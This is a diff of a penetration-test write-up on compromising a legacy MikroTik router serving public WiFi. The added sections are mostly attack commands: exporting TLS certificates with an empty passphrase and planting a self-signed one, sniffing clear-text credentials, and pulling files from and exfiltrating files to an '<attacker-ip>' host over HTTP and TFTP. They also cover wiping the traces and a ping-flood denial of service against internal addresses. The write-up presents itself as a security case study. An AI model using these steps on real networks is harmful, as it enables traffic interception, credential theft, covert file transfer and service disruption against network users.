@@ -23,7 +23,7 @@ _Write Up Date: 12/29/2025_
 
 This writeup details a "Boot-to-Root" engagement targeting a Public WiFi network powered by legacy MikroTik infrastructure. Our concept focuses on identifying and exploiting outdated services that have been left accessible on the LAN. We explore attack vectors ranging from unauthenticated administrative access via the legacy `webconf` binary to full system compromise, persistence, and lateral movement.
 
-The existence of such vulnerable edge devices poses significant risks, potentially escalating to national security concerns when these networks bridge into critical infrastructure or handle sensitive data. Modern attackers frequently target these "low-hanging fruit"—outdated IoT systems and routers—to establish beachheads within otherwise secure perimeters. This report serves as a case study on the dangers of technical debt and the critical need for lifecycle management in network hardware.
+The existence of such vulnerable edge devices poses significant risks, potentially escalating to national security concerns when these networks bridge into critical infrastructure or handle sensitive data. Modern attackers frequently target these "low-hanging fruit"-outdated IoT systems and routers-to establish beachheads within otherwise secure perimeters. This report serves as a case study on the dangers of technical debt and the critical need for lifecycle management in network hardware.
 
 ## 3. Scope
 Any and all LAN/VLAN services diconnected from the centralized business/hosting platform.
@@ -38,7 +38,7 @@ Any and all LAN/VLAN services diconnected from the centralized business/hosting 
  
 * **3.4 Attack Vectors**
     - `http://172.16.0.1:8000` Possible SQLI, XSSRF, XSS & Bufferoverflow RCE.
-    - `http://172.16.0.1:55511` WebConf CLI
+    - `http://172.16.0.1:55511` WebConf CLI.
 
 ## 4. Methodology
 
@@ -238,26 +238,58 @@ Target: `http://172.16.0.1:55511`
     * **3.2 SE**
         - `ppp profile set comment="MikroTik Remote Web-Service Profile"`
 
-* **4. TLS Hijacking**
-    * **4.1 Check Existing Certs**
+* **4. TLS Hijacking** Possibly one of the worst _vectors. Allowing for full control over data sent over the network. NOTE: This is also needed for remote access to the server directly._
+    * **4.1 Check Existing Certs** Validate any existing TLS certificates.
         - `certificate print`
-    * **4.2 Export Any Existing**
+    * **4.2 Export Any Existing** Export any existing (proper way...)
         - `certificate export-certificate [find name~"."] export-passphrase=""` _NOTE: This file will be able to be located using `file print`. I have noticed that the `export` command fails on direct download, further down we will implement the `tool fetch` command to `fetch` the file down to our device._
-    * **4.3 Build Your Certificates**
+    * **4.3 Build Your Certificates** Build you own _SE_ method.
         - `certificate add name="www" common-name="MikroTik" country="US" state=".." locality="..." organization="MikroTik" days-valid=3650 key-size=2048`
     * **4.4 Sign It**
         - `certificate sign www`
     * **4.5 Assign To The Web-Services**
         - `ip service set www certificate=www disabled=no`
-    * **4.6 Sanitize**
+    * **4.6 Sanitize** Always santize post `export`.
         - `file remove cert_export_*`
+    * **4.7 Remove** Delete the cert, _Nuclear Option._
+        - `certificate remove www`
 
-* **5. M-I-T-M Hijacking**
+* **6. Interface Identification & Bridge Information**
+    * **6.1 List** Identify all the interfaces from ether to wlan.
+        - `interface print detail`
 
-* **5. Hotspot VLAN Hijacking**
+* **7. The 'sniffer' Tool**
+    * **7.1 Clear Text Creds: Quick**
+        - `tool sniffer quick interface=bridge` Where `interface` can also be `eth` or `wlan`.
+    * **7.2 Spawn Offline Harvesting**
+        - `tool sniffer start file-name=security-log.pcap file-limit=10MiB`
+    * **7.3 Stop the Spawn**
+        - `tool sniffer stop`
 
-* **6. Open VPN VPS Persistence**
+* **8. The 'fetch' Tool**
+    * **8.1 Dropping Files To The Box**
+        1. In a seperate terminal execute `python3 -m http.server 0.0.0.0` inside of the desired directory of deployment.
+        2. Inside of the CLI execute `tool fetch url="http://<attacker-ip>:8000/myfile.rsc" dst-path=myfile.rsc mode=http`
+        3. Validate via `file print`
+        4. Sanitize via `file remove file=myfile.rsc`
+    * **8.2 Exporting Files From The Box**
+        1. Install the requirments.
+            - `sudo apt install tftpd-hpa`
+            - `sudo mkdir /tftp && sudo chmod 777 /tftp`
+            - `sudo systemctl start tftp-hpa`
+        2. Fetch the file.
+            - `tool fetch url="http://<attacker-ip>:8000/myfile.rsc" mode=tftp src-path=myfile.rsc`
+        3. Clean Up.
+            - `sudo systemctl disable tftp-hpa`
+            - `sudo systemctl stop tftp-hpa`
+            - `sudo rm -rf /tftp/myfile.rsc`
+            - `sudo chmod 644 /tftp`
+        4. Sanitize.
+            - `file remove file=myfile.rsc`
 
-* **7. CLI WebConf Remote Persistence**
+* **9. The 'ping-flood' Tool**
+    > NOTE: The intended use here is for targeted Layre-7 (smurf) attacks, or internal DoS.
+    * **9.1 Execution**
+        - `tool ping-flood count=1000 size=1492 address=172.16.0.x`
 
-* **8. Establish Proxy Tunneling**
+    
